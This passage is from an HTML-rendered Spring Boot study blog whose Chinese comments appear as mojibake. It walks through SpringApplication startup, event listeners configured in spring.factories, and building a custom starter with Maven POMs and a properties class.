class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(Object[] sources)</span> &#123;</span><br><span class="line">    <span class="comment">//ä¿å­˜ä¸»é…ç½®ç±»</span></span><br><span class="line">    <span class="keyword">if</span> (sources != <span class="literal">null</span> &amp;&amp; sources.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.sources.addAll(Arrays.asList(sources));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ¤æ–­å½“å‰æ˜¯å¦ä¸€ä¸ªwebåº”ç”¨</span></span><br><span class="line">    <span class="built_in">this</span>.webEnvironment = deduceWebEnvironment();</span><br><span class="line">    <span class="comment">//ä»ç±»è·¯å¾„ä¸‹æ‰¾åˆ°META-INF/spring.factoriesé…ç½®çš„æ‰€æœ‰ApplicationContextInitializerï¼›ç„¶åä¿å­˜èµ·æ¥</span></span><br><span class="line">    setInitializers((Collection) getSpringFactoriesInstances(</span><br><span class="line">        ApplicationContextInitializer.class));</span><br><span class="line">    <span class="comment">//ä»ç±»è·¯å¾„ä¸‹æ‰¾åˆ°ETA-INF/spring.factoriesé…ç½®çš„æ‰€æœ‰ApplicationListener</span></span><br><span class="line">    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));</span><br><span class="line">    <span class="comment">//ä»å¤šä¸ªé…ç½®ç±»ä¸­æ‰¾åˆ°æœ‰mainæ–¹æ³•çš„ä¸»é…ç½®ç±»</span></span><br><span class="line">    <span class="built_in">this</span>.mainApplicationClass = deduceMainApplicationClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306145727.png"></p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306145855.png"></p><h2><span id="2-è¿è¡Œrunæ–¹æ³•">2ã€è¿è¡Œrunæ–¹æ³•</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(String... args)</span> &#123;</span><br><span class="line">   <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">FailureAnalyzers</span> <span class="variable">analyzers</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//è·å–SpringApplicationRunListenersï¼›ä»ç±»è·¯å¾„ä¸‹META-INF/spring.factories</span></span><br><span class="line">   <span class="type">SpringApplicationRunListeners</span> <span class="variable">listeners</span> <span class="operator">=</span> getRunListeners(args);</span><br><span class="line">    <span class="comment">//å›è°ƒæ‰€æœ‰çš„è·å–SpringApplicationRunListener.starting()æ–¹æ³•</span></span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//å°è£…å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">      <span class="type">ApplicationArguments</span> <span class="variable">applicationArguments</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultApplicationArguments</span>(</span><br><span class="line">            args);</span><br><span class="line">      <span class="comment">//å‡†å¤‡ç¯å¢ƒ</span></span><br><span class="line">      <span class="type">ConfigurableEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">       <span class="comment">//åˆ›å»ºç¯å¢ƒå®Œæˆåå›è°ƒSpringApplicationRunListener.environmentPrepared()ï¼›è¡¨ç¤ºç¯å¢ƒå‡†å¤‡å®Œæˆ</span></span><br><span class="line">       </span><br><span class="line">      <span class="type">Banner</span> <span class="variable">printedBanner</span> <span class="operator">=</span> printBanner(environment);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//åˆ›å»ºApplicationContextï¼›å†³å®šåˆ›å»ºwebçš„iocè¿˜æ˜¯æ™®é€šçš„ioc</span></span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">       </span><br><span class="line">      analyzers = <span class="keyword">new</span> <span class="title class_">FailureAnalyzers</span>(context);</span><br><span class="line">       <span class="comment">//å‡†å¤‡ä¸Šä¸‹æ–‡ç¯å¢ƒ;å°†environmentä¿å­˜åˆ°iocä¸­ï¼›è€Œä¸”applyInitializers()ï¼›</span></span><br><span class="line">       <span class="comment">//applyInitializers()ï¼šå›è°ƒä¹‹å‰ä¿å­˜çš„æ‰€æœ‰çš„ApplicationContextInitializerçš„initializeæ–¹æ³•</span></span><br><span class="line">       <span class="comment">//å›è°ƒæ‰€æœ‰çš„SpringApplicationRunListenerçš„contextPrepared()ï¼›</span></span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       <span class="comment">//prepareContextè¿è¡Œå®Œæˆä»¥åå›è°ƒæ‰€æœ‰çš„SpringApplicationRunListenerçš„contextLoadedï¼ˆï¼‰ï¼›</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment">//såˆ·æ–°å®¹å™¨ï¼›iocå®¹å™¨åˆå§‹åŒ–ï¼ˆå¦‚æœæ˜¯webåº”ç”¨è¿˜ä¼šåˆ›å»ºåµŒå…¥å¼çš„Tomcatï¼‰ï¼›Springæ³¨è§£ç‰ˆ</span></span><br><span class="line">       <span class="comment">//æ‰«æï¼Œåˆ›å»ºï¼ŒåŠ è½½æ‰€æœ‰ç»„ä»¶çš„åœ°æ–¹ï¼›ï¼ˆé…ç½®ç±»ï¼Œç»„ä»¶ï¼Œè‡ªåŠ¨é…ç½®ï¼‰</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">       <span class="comment">//ä»iocå®¹å™¨ä¸­è·å–æ‰€æœ‰çš„ApplicationRunnerå’ŒCommandLineRunnerè¿›è¡Œå›è°ƒ</span></span><br><span class="line">       <span class="comment">//ApplicationRunnerå…ˆå›è°ƒï¼ŒCommandLineRunnerå†å›è°ƒ</span></span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">       <span class="comment">//æ‰€æœ‰çš„SpringApplicationRunListenerå›è°ƒfinishedæ–¹æ³•</span></span><br><span class="line">      listeners.finished(context, <span class="literal">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">StartupInfoLogger</span>(<span class="built_in">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">       <span class="comment">//æ•´ä¸ªSpringBootåº”ç”¨å¯åŠ¨å®Œæˆä»¥åè¿”å›å¯åŠ¨çš„iocå®¹å™¨ï¼›</span></span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(ex);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="3-äº‹ä»¶ç›‘å¬æœºåˆ¶">3ã€äº‹ä»¶ç›‘å¬æœºåˆ¶</span></h2><p>é…ç½®åœ¨META-INF&#x2F;spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplicationContextInitializer</span> <span class="keyword">implements</span> <span class="title class_">ApplicationContextInitializer</span>&lt;ConfigurableApplicationContext&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(ConfigurableApplicationContext applicationContext)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ApplicationContextInitializer...initialize...&quot;</span>+applicationContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>SpringApplicationRunListener</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloSpringApplicationRunListener</span> <span class="keyword">implements</span> <span class="title class_">SpringApplicationRunListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¿…é¡»æœ‰çš„æ„é€ å™¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloSpringApplicationRunListener</span><span class="params">(SpringApplication application, String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">starting</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpringApplicationRunListener...starting...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">environmentPrepared</span><span class="params">(ConfigurableEnvironment environment)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> environment.getSystemProperties().get(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;SpringApplicationRunListener...environmentPrepared..&quot;</span>+o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextPrepared</span><span class="params">(ConfigurableApplicationContext context)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpringApplicationRunListener...contextPrepared...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextLoaded</span><span class="params">(ConfigurableApplicationContext context)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpringApplicationRunListener...contextLoaded...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finished</span><span class="params">(ConfigurableApplicationContext context, Throwable exception)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpringApplicationRunListener...finished...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é…ç½®ï¼ˆMETA-INF&#x2F;spring.factoriesï¼‰</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">org.springframework.context.ApplicationContextInitializer</span>=<span class="string">\</span></span><br><span class="line"><span class="string">com.atguigu.springboot.listener.HelloApplicationContextInitializer</span></span><br><span class="line"></span><br><span class="line"><span class="attr">org.springframework.boot.SpringApplicationRunListener</span>=<span class="string">\</span></span><br><span class="line"><span class="string">com.atguigu.springboot.listener.HelloSpringApplicationRunListener</span></span><br></pre></td></tr></table></figure><p>åªéœ€è¦æ”¾åœ¨iocå®¹å™¨ä¸­</p><p><strong>ApplicationRunner</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplicationRunner</span> <span class="keyword">implements</span> <span class="title class_">ApplicationRunner</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ApplicationRunner...run....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CommandLineRunner</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloCommandLineRunner</span> <span class="keyword">implements</span> <span class="title class_">CommandLineRunner</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String... args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CommandLineRunner...run...&quot;</span>+ Arrays.asList(args));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="å…«-è‡ªå®šä¹‰starter">å…«ã€è‡ªå®šä¹‰starter</span></h1><p>starterï¼š</p><p>â€‹1ã€è¿™ä¸ªåœºæ™¯éœ€è¦ä½¿ç”¨åˆ°çš„ä¾èµ–æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>â€‹2ã€å¦‚ä½•ç¼–å†™è‡ªåŠ¨é…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>  <span class="comment">//æŒ‡å®šè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªé…ç½®ç±»</span></span><br><span class="line"><span class="meta">@ConditionalOnXXX</span>  <span class="comment">//åœ¨æŒ‡å®šæ¡ä»¶æˆç«‹çš„æƒ…å†µä¸‹è‡ªåŠ¨é…ç½®ç±»ç”Ÿæ•ˆ</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter</span>  <span class="comment">//æŒ‡å®šè‡ªåŠ¨é…ç½®ç±»çš„é¡ºåº</span></span><br><span class="line"><span class="meta">@Bean</span>  <span class="comment">//ç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationPropertie</span>ç»“åˆç›¸å…³xxxPropertiesç±»æ¥ç»‘å®šç›¸å…³çš„é…ç½®</span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span> <span class="comment">//è®©xxxPropertiesç”Ÿæ•ˆåŠ å…¥åˆ°å®¹å™¨ä¸­</span></span><br><span class="line"></span><br><span class="line">è‡ªåŠ¨é…ç½®ç±»è¦èƒ½åŠ è½½</span><br><span class="line">å°†éœ€è¦å¯åŠ¨å°±åŠ è½½çš„è‡ªåŠ¨é…ç½®ç±»ï¼Œé…ç½®åœ¨META-INF/spring.factories</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br></pre></td></tr></table></figure><p>â€‹3ã€æ¨¡å¼ï¼š</p><p>å¯åŠ¨å™¨åªç”¨æ¥åšä¾èµ–å¯¼å…¥ï¼›</p><p>ä¸“é—¨æ¥å†™ä¸€ä¸ªè‡ªåŠ¨é…ç½®æ¨¡å—ï¼›</p><p>å¯åŠ¨å™¨ä¾èµ–è‡ªåŠ¨é…ç½®ï¼›åˆ«äººåªéœ€è¦å¼•å…¥å¯åŠ¨å™¨ï¼ˆstarterï¼‰</p><p>mybatis-spring-boot-starterï¼›è‡ªå®šä¹‰å¯åŠ¨å™¨å-spring-boot-starter</p><p>æ­¥éª¤ï¼š</p><p>1ï¼‰ã€å¯åŠ¨å™¨æ¨¡å—</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--å¯åŠ¨å™¨--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--å¼•å…¥è‡ªåŠ¨é…ç½®æ¨¡å—--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2ï¼‰ã€è‡ªåŠ¨é…ç½®æ¨¡å—</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">name</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!--å¼•å…¥spring-boot-starterï¼›æ‰€æœ‰starterçš„åŸºæœ¬é…ç½®--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.starter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;atguigu.hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloProperties</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String prefix;</span><br><span class="line">    <span class="keyword">private</span> String suffix;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPrefix</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrefix</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.prefix = prefix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSuffix</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> suffix;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSuffix</span><span class="params">(String suffix)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.suffix = suffix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span 